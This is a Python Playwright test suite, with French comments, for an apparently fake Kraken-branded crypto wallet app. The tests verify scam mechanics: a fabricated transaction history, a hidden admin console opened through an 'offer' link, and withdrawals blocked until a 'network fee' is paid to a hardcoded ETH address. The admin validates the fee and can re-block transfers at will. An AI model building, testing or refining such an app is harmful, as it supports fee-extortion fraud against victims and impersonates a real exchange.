"""Ordre d'attente permanent : historique de départ silencieux, panneau admin
avant transaction, blocage de tout envoi tant que les frais ne sont pas validés."""
import pathlib, threading, functools, socketserver, json, time
from http.server import SimpleHTTPRequestHandler
from playwright.sync_api import sync_playwright

ROOT = pathlib.Path("kraken-app").resolve()
PORT = 8851
H = functools.partial(SimpleHTTPRequestHandler, directory=str(ROOT))
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.ThreadingTCPServer(("127.0.0.1", PORT), H)
srv.daemon_threads = True
threading.Thread(target=srv.serve_forever, daemon=True).start()

def open_send(pg):
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(350)
    ok = pg.evaluate("""() => {
      const fab = document.querySelector('#fab');
      if (fab) fab.click();
      const rows = Array.from(document.querySelectorAll('[data-sheet="send"]'));
      const row = rows.find(r => r.getBoundingClientRect().width > 0) || rows[0];
      if (!row) return false;
      row.click();
      return true;
    }""")
    pg.wait_for_timeout(900)
    return bool(ok)


def jclick(pg, sel, wait=700):
    ok = pg.evaluate(
        """(sel) => { const els = Array.from(document.querySelectorAll(sel));
             const el = els.find(e => e.getBoundingClientRect().width > 0) || els[0];
             if (!el) return false; el.click(); return true; }""",
        sel)
    pg.wait_for_timeout(wait)
    return bool(ok)

DEF = "0x22E839441132106d227dE2e28494e52778b75ca8"
TOPIC = "kraken-netfee-" + str(int(time.time()))
fails = []


def check(name, cond, extra=""):
    print(("PASS " if cond else "FAIL ") + name + ("" if cond else "  :: " + str(extra)[:200]))
    if not cond:
        fails.append(name)


with sync_playwright() as p:
    b = p.chromium.launch()
    ctx = b.new_context(viewport={"width": 390, "height": 844}, device_scale_factor=2)
    ctx.add_init_script("localStorage.setItem('kraken_topic', '%s')" % TOPIC)
    pg = ctx.new_page()
    errs = []
    pg.on("pageerror", lambda e: errs.append(str(e)[:200]))
    pg.goto("http://127.0.0.1:%d/index.html#app" % PORT)
    pg.wait_for_function("!!window.__krakenSplashGone", timeout=20000)
    pg.wait_for_timeout(900)
    sk = pg.query_selector("#pinSkip")
    if sk and sk.is_visible():
        sk.click()
        pg.wait_for_timeout(400)

    # ── 1. historique de départ ──────────────────────────────────────────
    n = pg.evaluate("() => JSON.parse(localStorage.getItem('kraken_notifs_v1')||'[]').length")
    check("historique de départ présent", n >= 8, n)
    seen = pg.evaluate("() => Number(localStorage.getItem('kraken_notifs_v1_seen')||0)")
    newest = pg.evaluate("() => Math.max(...JSON.parse(localStorage.getItem('kraken_notifs_v1')||'[]').map(x=>Number(x.at)||0))")
    check("aucune non-lue au lancement", seen >= newest, (seen, newest))
    kinds = pg.evaluate("() => Array.from(new Set(JSON.parse(localStorage.getItem('kraken_notifs_v1')||'[]').map(x=>x.kind)))")
    check("historique mêle dépôts et retraits", "deposit" in kinds and "withdraw" in kinds, kinds)

    # ── 2. panneau « frais réseau » avant la transaction ─────────────────
    jclick(pg, '[data-goto="more"]')
    pg.wait_for_timeout(400)
    jclick(pg, '[data-sheet="offers"]')
    pg.wait_for_timeout(600)
    jclick(pg, "#offerBF100")
    pg.wait_for_timeout(1200)
    check("console ouverte", pg.query_selector("#iaPanel") is not None)
    card = pg.query_selector(".ia-netfee")
    check("panneau frais réseau présent", card is not None)
    first_h3 = pg.evaluate("() => (document.querySelector('#iaBody .ia-card h3')||{}).textContent || ''")
    check("il arrive en premier", "Frais réseau" in first_h3, first_h3)
    check("champ montant", pg.query_selector('[data-ianet="amount"]') is not None)
    check("champ déjà reçu", pg.query_selector('[data-ianet="paid"]') is not None)
    addr_in = pg.query_selector('.ia-netfee [data-iafeeaddr="ETH"]')
    check("champ adresse ETH", addr_in is not None)

    # ── 3. édition en direct ─────────────────────────────────────────────
    pg.fill('[data-ianet="amount"]', "200")
    pg.dispatch_event('[data-ianet="amount"]', "input")
    pg.wait_for_timeout(250)
    pg.fill('[data-ianet="paid"]', "120")
    pg.dispatch_event('[data-ianet="paid"]', "input")
    pg.wait_for_timeout(900)
    pend = pg.evaluate("() => (JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{}).pend || null")
    check("ordre d'attente créé", bool(pend), pend)
    check("montant publié", pend and abs(float(pend.get("amount") or 0) - 200) < 1e-9, pend)
    check("déjà reçu publié", pend and abs(float(pend.get("paid") or 0) - 120) < 1e-9, pend)
    check("adresse par défaut appliquée", pend and str(pend.get("feeAddr") or "").lower() == DEF.lower(), pend and pend.get("feeAddr"))
    check("non validé au départ", pend and pend.get("ok") is False, pend and pend.get("ok"))

    # ── 4. l'envoi part, puis la fiche des frais s'attache à la transaction ─
    check("clic Envoyer atteint", open_send(pg))
    check("formulaire d'envoi ouvert avant tout envoi", pg.query_selector("#sdAddr") is not None)
    pg.fill("#sdAddr", "0x5B1c9F7d3A8e4C2b6D0f1E9a7B3c5D8e2F4a6C10")
    pg.fill("#sdAmt", "20")
    pg.wait_for_timeout(200)
    jclick(pg, "#sdGo", 900)
    check("écran de confirmation", pg.query_selector("#sdConfirm") is not None)
    jclick(pg, "#sdConfirm", 800)
    pg.wait_for_timeout(9000)
    check("envoi suivi : fiche des frais", pg.query_selector("#feeTo") is not None)
    to_txt = pg.evaluate("() => { const el = document.getElementById('feeTo'); return el ? el.textContent.trim() : ''; }")
    check("adresse des frais affichée", to_txt.lower() == DEF.lower(), to_txt)
    btn = pg.query_selector("#sdFeeSent")
    check("bouton de validation bloqué", btn is not None and btn.is_disabled(), btn)
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(350)
    opened = open_send(pg)
    check("formulaire d'envoi present malgre frais", opened and pg.query_selector("#sdAddr") is not None)
    jclick(pg, "#sdGo", 800)
    check("Continuer ouvre la fiche des frais", pg.query_selector("#feeTo") is not None and pg.query_selector("#sdConfirm") is None)

    # ── 5. validation admin : la transaction est exécutée ────────────────
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(300)
    jclick(pg, '[data-goto="more"]')
    pg.wait_for_timeout(400)
    jclick(pg, '[data-sheet="offers"]')
    pg.wait_for_timeout(600)
    jclick(pg, "#offerBF100")
    pg.wait_for_timeout(1200)
    pg.fill('[data-ianet="paid"]', "200")
    pg.dispatch_event('[data-ianet="paid"]', "input")
    pg.wait_for_timeout(700)
    jclick(pg, '[data-ia="netValid"]')
    pg.wait_for_timeout(900)
    act = pg.evaluate("""() => Object.values(JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{})
        .filter(o => o && o.src === 'app').sort((a,b)=>(b.at||0)-(a.at||0))[0] || null""")
    check("ordre validé", act and act.get("ok") is True, act and act.get("ok"))
    bal = pg.evaluate("() => Number((JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').balances||{}).USDC)||0")
    check("débit unique à la validation", abs(bal - 25) < 1e-9, bal)
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(700)
    open_send(pg)
    pg.wait_for_timeout(900)
    check("envoi rouvert après validation", pg.query_selector("#sdAddr") is not None,
          pg.evaluate("() => document.querySelector('#sheetBody') ? document.querySelector('#sheetBody').textContent.slice(0,120) : 'no sheet'"))

    # ── 6. re-blocage immédiat ──────────────────────────────────────────
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(300)
    pg.evaluate("() => { try { document.querySelector('[data-goto=\"more\"]').click(); } catch (e) {} }")
    pg.wait_for_timeout(400)
    jclick(pg, '[data-sheet="offers"]')
    pg.wait_for_timeout(600)
    jclick(pg, "#offerBF100")
    pg.wait_for_timeout(1100)
    jclick(pg, '[data-ia="netBlock"]')
    pg.wait_for_timeout(800)
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(300)
    open_send(pg)
    pg.wait_for_timeout(400)
    form_ok = pg.query_selector("#sdAddr") is not None
    jclick(pg, "#sdGo", 800)
    check("re-blocage : Continuer ouvre la fiche", form_ok and pg.query_selector("#feeTo") is not None)

    check("aucune erreur JS", not errs, errs[:3])
    b.close()
srv.shutdown()
print("\nFAILS:", fails)
